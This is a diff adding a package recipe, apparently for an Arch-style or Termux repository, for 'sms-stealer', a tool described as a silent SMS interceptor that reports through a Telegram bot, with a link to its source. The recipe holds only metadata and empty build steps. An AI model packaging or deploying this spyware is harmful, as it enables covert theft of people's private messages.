@@ -1,0 +1,20 @@
+# Maintainer: Alienkrishn [Anon4You]
+# Ported from TermuxVoid APT repo (packages/sms-stealer)
+
+pkgname="sms-stealer"
+pkgver=0.1.0
+pkgrel=0
+pkgdesc='Silent SMS interceptor via Telegram bot'
+arch=('any')
+url="https://github.com/Anon4You/sms-stealer"
+depends=('git' 'ruby' 'apkeditor' 'apksigner')
+install="sms-stealer.install"
+options=('!strip')
+
+build() {
+    return 0
+}
+
+package() {
+    return 0
+}
